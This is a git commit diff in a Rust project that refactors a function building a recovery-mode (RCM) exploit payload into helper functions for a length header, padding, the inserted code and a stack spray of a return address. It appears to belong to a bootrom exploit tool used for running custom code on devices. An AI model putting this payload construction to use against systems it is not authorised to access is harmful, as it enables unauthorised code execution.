12d3dc7a25e6dfd4f31fcf36043a1f4c1ba98aa4
Justus K <justus.k@protonmail.com>
2020-01-14 18:41:51 +0100

    Split creation of payload into multiple methods

--- src/lib.rs
+++ src/lib.rs
@@ -29,26 +29,36 @@ const STACK_SPRAY_END: u32 = 0x40017000;
 pub fn build_payload(code: Bytes) -> Bytes {
     let mut payload = BytesMut::new();
 
-    payload.put_u32_le(LENGTH);
-
-    let padding = b"\0".repeat(PAYLOAD_START_ADDR as usize - payload.len());
-    payload.put_slice(padding.as_slice());
-
-    let padding_size = STACK_SPRAY_START - PAYLOAD_START_ADDR;
-    let mut code = code;
-    let second_part = code.split_off(padding_size as usize);
-    payload.put(code);
-
-    let repeat_count = ((STACK_SPRAY_END - STACK_SPRAY_START) / 4) as u32;
-    for _ in 0..repeat_count {
-        payload.put_u32_le(RCM_PAYLOAD_ADDR);
-    }
-
-    payload.put(second_part);
-
-    let padding_size = 0x1000 - (payload.len() % 0x1000);
-    let padding = b"\0".repeat(padding_size);
-    payload.put_slice(padding.as_slice());
+    insert_length(&mut payload);
+    let len = payload.len();
+    insert_padding(&mut payload, PAYLOAD_START_ADDR as usize - len);
+    insert_code(&mut payload, code);
+    let len = payload.len();
+    insert_padding(&mut payload, 0x1000 - (len % 0x1000));
 
     payload.freeze()
+}
+
+fn insert_padding(payload: &mut BytesMut, len: usize) {
+    let padding = b"\0".repeat(len);
+    payload.put_slice(padding.as_slice());
+}
+
+fn insert_length(payload: &mut BytesMut) {
+    payload.put_u32_le(LENGTH);
+}
+
+fn insert_code(payload: &mut BytesMut, code: Bytes) {
+    let mut first_part = code;
+    let second_part = first_part.split_off((STACK_SPRAY_START - PAYLOAD_START_ADDR) as usize);
+    payload.put(first_part);
+    insert_stack_spray(payload);
+    payload.put(second_part);
+}
+
+fn insert_stack_spray(payload: &mut BytesMut) {
+    let count = ((STACK_SPRAY_END - STACK_SPRAY_START) / 4) as u32;
+    for _ in 0..count {
+        payload.put_u32_le(RCM_PAYLOAD_ADDR);
+    }
 }
